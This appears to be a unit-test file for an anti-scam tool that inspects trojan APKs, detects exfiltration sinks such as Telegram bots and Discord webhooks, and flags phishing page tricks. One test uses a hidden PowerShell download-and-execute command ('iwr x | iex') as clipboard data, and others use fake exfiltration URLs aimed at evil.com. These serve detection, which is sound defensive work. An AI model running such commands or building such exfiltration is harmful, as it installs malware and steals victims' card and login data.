// Unit tests for the X-ray's pure parts (no browser needed): app inspector, canary trap,
// exfiltration classifier, "what it wants" summary, page tricks, and the offline caller check.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import { fetchBytes } from '../server/netguard.js';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { inspectApk } from '../server/apk.js';
import { carriesCanary, classifySink, scanCode, pageIntent, pageTricks, canaryValues, fillClass } from '../server/xray-intent.js';
import { phoneVerdict } from '../server/intel.js';
import { callerCheck } from '../engine/index.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

test('app inspector reads a real binary AndroidManifest and spots the banking-trojan toolkit', () => {
  const file = path.join(ROOT, 'demo-sites', 'files', 'demo-app.apk');
  if (!fs.existsSync(file)) return; // built by tools/make-demo-apk.js (needs the Android SDK)
  const r = inspectApk(fs.readFileSync(file));
  assert.equal(r.ok, true);
  assert.equal(r.package, 'demo.veto.securebank.update');
  assert.equal(r.label, 'SecureBank Update');
  assert.equal(r.hasCode, false);
  const caps = r.capabilities.map(c => c.id);
  for (const c of ['sms', 'accessibility', 'overlay', 'admin']) assert.ok(caps.includes(c), c);
  assert.equal(r.trojanProfile, true);
  assert.ok(r.risk >= 0.95);
  assert.match(r.sha256, /^[0-9a-f]{64}$/);
});

test('app inspector fails safely on junk', () => {
  const r = inspectApk(Buffer.from('this is not a zip file at all'));
  assert.equal(r.ok, false);
  assert.ok(r.error);
});

test('canary detection: raw, URL-encoded, spaced, JSON and base64', () => {
  const run = 'kqtest1';
  assert.ok(carriesCanary(`card=4111+1111+1111+1111&x=1`, run));
  assert.ok(carriesCanary(`{"text":"card_number: 4111 1111 1111 1111"}`, run));
  assert.ok(carriesCanary(`d=${encodeURIComponent('name: Kc kqtest1')}`, run));
  assert.ok(carriesCanary(`p=${Buffer.from('user=kqtest1@example.invalid').toString('base64')}`, run));
  assert.ok(!carriesCanary('https://cdn.example.com/app.js?v=12345', run));
  assert.ok(!carriesCanary('', run));
});

test('exfiltration sinks are named in plain words (and bot tokens are masked)', () => {
  const t = classifySink('https://api.telegram.org/bot7012345678:AAH-secret-token/sendMessage', 'evil.com');
  assert.equal(t.kind, 'telegram');
  assert.equal(t.bot, 'bot7012345678:••••');
  assert.ok(!JSON.stringify(t).includes('secret'));
  assert.equal(classifySink('https://discord.com/api/webhooks/123/abc', 'evil.com').kind, 'discord');
  assert.equal(classifySink('https://script.google.com/macros/s/AKfy/exec', 'evil.com').kind, 'apps_script');
  assert.equal(classifySink('https://formspree.io/f/xyz', 'evil.com').kind, 'form_service');
  assert.equal(classifySink('https://www.evil.com/post.php', 'evil.com').kind, 'own_server');
  assert.equal(classifySink('https://collector.other.net/p', 'evil.com').kind, 'other_site');
});

test('code scan finds a Telegram bot token without leaking it', () => {
  const s = scanCode("var u='https://api.telegram.org/bot7012345678:AAH-veto-demo-token-not-real-000000/sendMessage'");
  assert.equal(s[0].kind, 'telegram');
  assert.ok(!s[0].evidence.includes('AAH'));
  assert.deepEqual(scanCode('console.log("hello")'), []);
});

test('fields are filled with the right fake value', () => {
  const v = canaryValues('kqx');
  assert.equal(v[fillClass({ type: 'text', name: 'card_number', id: '', ph: '', label: '', ac: 'cc-number' })], '4111 1111 1111 1111');
  assert.equal(v[fillClass({ type: 'email', name: 'mail', id: '', ph: '', label: '', ac: '' })], 'kqx@example.invalid');
  assert.equal(fillClass({ type: 'text', name: 'otp', id: '', ph: '', label: '', ac: 'one-time-code' }), 'otp');
});

test('"what it wants": card + CVV + OTP behind a fee', () => {
  const i = pageIntent({ asks: new Set(['card', 'expiry', 'cvv', 'otp']), tricks: { fee: true }, exfil: [{ kind: 'telegram', host: 'api.telegram.org', en: 'a Telegram bot', ar: 'بوت' }] });
  assert.match(i.en, /small “fee”/);
  assert.match(i.en, /card number, expiry date and CVV/);
  assert.match(i.en, /enough to spend your money/);
  assert.match(i.sendsTo.en, /Telegram bot/);
  assert.ok(i.ar.length > 20);
});

test('"what it wants": fake virus page that pushes a trojan app', () => {
  const i = pageIntent({ asks: new Set(), apk: { label: 'Phone Cleaner Pro', trojanProfile: true }, downloads: [{ file: 'Cleaner-Pro.apk' }], tricks: { scare: true } });
  assert.deepEqual(i.goals, ['scare', 'install_app']);
  assert.match(i.en, /FAKE virus warning/);
  assert.match(i.en, /banking trojan/);
});

test('page tricks: clipboard command, scareware, remote-access push', () => {
  const t = pageTricks({ events: [{ t: 'clipboard', d: 'powershell -w hidden -c iwr x | iex' }, { t: 'vibrate' }, { t: 'backtrap' }],
    text: 'Your phone is infected with 4 viruses! Install AnyDesk so our agent can help.', links: ['https://wa.me/971500000000'] });
  assert.ok(t.clipboardCommand);
  assert.equal(t.scare, true);
  assert.deepEqual(t.scareTricks, ['vibrate', 'backtrap']);
  assert.equal(t.remote.toLowerCase(), 'anydesk');
  assert.equal(t.chat.length, 1);
  assert.equal(pageTricks({ text: 'Welcome to our bakery. Fresh bread daily.' }).scare, false);
});

test('caller check: one-ring range, hidden number, official number, saved contact', () => {
  const ring = callerCheck('+674 555 1234');
  assert.equal(ring.verdict, 'danger');
  assert.equal(ring.signals[0].id, 'one_ring');
  assert.equal(callerCheck('').signals[0].id, 'hidden');
  const off = callerCheck('600 54 0000');
  assert.equal(off.positives[0].id, 'official_number');
  assert.match(off.positives[0].en, /can be faked/);
  assert.equal(callerCheck('+44 7700 900123').signals[0].id, 'foreign');
  assert.equal(callerCheck('+44 7700 900123', { inContacts: true, savedName: 'Uncle' }).verdict, 'known');
  assert.equal(callerCheck('+971 50 123 4567', { reported: ['050 123 4567'] }).signals[0].id, 'reported_by_you');
});

test('phone reputation fields become plain signals', () => {
  const v = phoneVerdict({ fraudScore: 92, recentAbuse: true, voip: true, lineType: 'VOIP' });
  assert.equal(v.signals[0].id, 'reported');
  assert.ok(v.signals.some(s => s.id === 'voip'));
  assert.ok(v.risk > 0.85);
  assert.equal(phoneVerdict({ fraudScore: 10 }).signals.length, 0);
});

test('header evidence separates an advertised destination from a 403 and never follows the hop', async t => {
  const paths = [];
  const server = http.createServer((req, res) => {
    paths.push(req.url);
    if (req.url === '/start') res.writeHead(301, { Location: '/landing?token=private#fragment' });
    else res.writeHead(403);
    res.end();
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  t.after(() => new Promise(resolve => server.close(resolve)));
  const origin = `http://fixture.localhost:${server.address().port}`;
  const options = { demoHosts: true, headersOnly: true };
  const redirect = await fetchBytes(origin + '/start', options);
  assert.equal(redirect.status, 301);
  assert.equal(redirect.destination, origin + '/landing');
  const denied = await fetchBytes(origin + '/denied', options);
  assert.equal(denied.status, 403);
  assert.equal(denied.destination, null);
  assert.deepEqual(paths, ['/start', '/denied']);
});
